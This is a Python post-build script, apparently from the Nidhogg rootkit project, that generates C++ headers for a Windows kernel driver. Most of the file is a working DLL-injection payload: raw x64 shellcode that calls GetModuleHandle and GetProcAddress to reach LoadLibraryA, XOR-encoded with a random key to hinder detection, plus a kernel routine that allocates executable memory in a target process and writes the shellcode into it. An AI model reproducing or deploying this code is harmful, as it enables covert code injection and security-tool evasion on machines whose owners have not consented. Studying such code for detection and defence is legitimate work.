import os
from random import randint

class NidhoggPostOperations():
    def __init__(self):
        self.current_path = os.path.dirname(os.path.realpath(__file__))

    def add_initial_operations(self):
        operations_size = 0
        initial_operations = ''

        # If the initial operations file exists, read it.
        if os.path.exists(os.path.join(self.current_path, "out.ndhg")):
            with open(os.path.join(self.current_path, "out.ndhg"), "rb") as initial_opearations_file:
                data = initial_opearations_file.read()
                operations_size = len(data)
                hexed_data = [hex(b) for b in data]
                initial_operations = ",".join(hexed_data)

        # Creating the new header file.
        new_initial_operations = '#pragma once\n#include \"pch.h\"\n\n'

        if operations_size == 0:
            new_initial_operations += 'constexpr SIZE_T InitialOperationsSize = 0;\n'
            new_initial_operations += 'constexpr UCHAR InitialOperations = {};\n'
        else:
            new_initial_operations += f'constexpr SIZE_T InitialOperationsSize = {operations_size};\n'
            new_initial_operations += 'constexpr UCHAR InitialOperations[InitialOperationsSize] = {' + initial_operations + '};\n'

        # Writing the new header file.
        with open(os.path.join(self.current_path, "Nidhogg\\InitialOperation.hpp"), "w") as initial_opeartions_header:
            initial_opeartions_header.write(new_initial_operations)
    
    def add_shellcode(self):
        # Generating xored shellcode
        xor_key = randint(1, 256)
        baseline_shellcode = [0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x50, 0x48, 0xB8, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x48, 0x89, 0x45, 0xE3, 0xC7, 0x45, 0xEB, 0x2E, 0x64, 0x6C, 0x6C, 0xC6, 0x45, 0xEF, 0x00, 0x48, 0x8D, 0x45, 0xE3, 0x48, 0x89, 0xC1, 0x48, 0xB8, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0xFF, 0xD0, 0x48, 0x89, 0x45, 0xF8, 0x48, 0xB8, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72, 0x48, 0x89, 0x45, 0xD6, 0xC7, 0x45, 0xDE, 0x61, 0x72, 0x79, 0x41, 0xC6, 0x45, 0xE2, 0x00, 0x48, 0x8D, 0x55, 0xD6, 0x48, 0x8B, 0x45, 0xF8, 0x48, 0x89, 0xC1, 0x48, 0xB8, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0xFF, 0xD0, 0x48, 0x89, 0x45, 0xF0, 0x48, 0x8B, 0x45, 0xF0, 0x48, 0xBA, 0x8A, 0x10, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD1, 0xFF, 0xD0, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x50, 0x5D, 0xC3, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x00]
        shellcode = ", ".join([hex(byte ^ xor_key) for byte in baseline_shellcode])

        # Adding the xored shellcode
        shellcode_file_data = '#pragma once\n#include \"pch.h\"\n#include \"MemoryUtils.hpp\"\n\n'
        shellcode_file_data += f'constexpr SIZE_T SHELLCODE_SIZE = {hex(len(baseline_shellcode))};\n'
        shellcode_file_data += f'constexpr SIZE_T XOR_KEY = {hex(xor_key)};\n'
        shellcode_file_data += 'constexpr SIZE_T GET_MODULE_HANDLE_OFFSET = 0x2A;\n'
        shellcode_file_data += 'constexpr SIZE_T GET_PROC_ADDRESS_OFFSET = 0x5E;\n'
        shellcode_file_data += 'constexpr SIZE_T DLL_NAME_OFFSET = 0x8A;\n'
        shellcode_file_data += 'constexpr SIZE_T SHELLCODE_ADDRESS_OFFSET = 0x72;\n'
        shellcode_file_data += 'UCHAR shellcodeTemplate[] = { ' + shellcode + ' };\n\n'

        # Adding the decryption function
        shellcode_file_data += '''
NTSTATUS PrepareShellcode(HANDLE hTargetProcess, PEPROCESS targetProcess, char* dllName, PVOID* shellcodeAddress) {
    SIZE_T shellcodeSize = SHELLCODE_SIZE;
    PVOID remoteAddress = NULL;
    NTSTATUS status = STATUS_SUCCESS;
    UCHAR newShellcode[SHELLCODE_SIZE]{};

    PVOID pGetProcAddress = NidhoggMemoryUtils->GetFuncAddress("GetProcAddress", L"\\\\Windows\\\\System32\\\\kernel32.dll");
    PVOID pGetModuleHandle = NidhoggMemoryUtils->GetFuncAddress("GetModuleHandle", L"\\\\Windows\\\\System32\\\\kernel32.dll");

    if (!dllName || !pGetProcAddress || !pGetModuleHandle)
        return STATUS_INVALID_PARAMETER;

    for (ULONG i = 0; i < SHELLCODE_SIZE; i++) {
        newShellcode[i] = shellcodeTemplate[i] ^ XOR_KEY;
    }

    memcpy(newShellcode + GET_MODULE_HANDLE_OFFSET, &pGetModuleHandle, sizeof(pGetModuleHandle));
    memcpy(newShellcode + GET_PROC_ADDRESS_OFFSET, &pGetProcAddress, sizeof(pGetProcAddress));
    memcpy(newShellcode + DLL_NAME_OFFSET, dllName, strlen(dllName) + 1);

    status = ZwAllocateVirtualMemory(hTargetProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

    if (!NT_SUCCESS(status))
        return status;
    shellcodeSize = SHELLCODE_SIZE;

    status = NidhoggMemoryUtils->KeWriteProcessMemory(&newShellcode, targetProcess, remoteAddress, shellcodeSize, KernelMode);

    if (!NT_SUCCESS(status)) {
        ZwFreeVirtualMemory(hTargetProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);
        return status;
    }
    shellcodeSize = SHELLCODE_SIZE;

    PVOID addr = (char*)remoteAddress + DLL_NAME_OFFSET;

    status = NidhoggMemoryUtils->KeWriteProcessMemory(&addr, targetProcess, (char*)remoteAddress + 
        SHELLCODE_ADDRESS_OFFSET, sizeof(PVOID), KernelMode);

    if (!NT_SUCCESS(status)) {
        ZwFreeVirtualMemory(hTargetProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);
        return status;
    }

    *shellcodeAddress = remoteAddress;
    return status;
}'''

        # Writing the new header file.
        with open(os.path.join(self.current_path, "Nidhogg\\InjectionShellcode.hpp"), "w") as injection_shellcode_header:
            injection_shellcode_header.write(shellcode_file_data)


def main():
    nidhogg_post_operations = NidhoggPostOperations()
    nidhogg_post_operations.add_initial_operations()
    nidhogg_post_operations.add_shellcode()


if __name__ == "__main__":
    main()
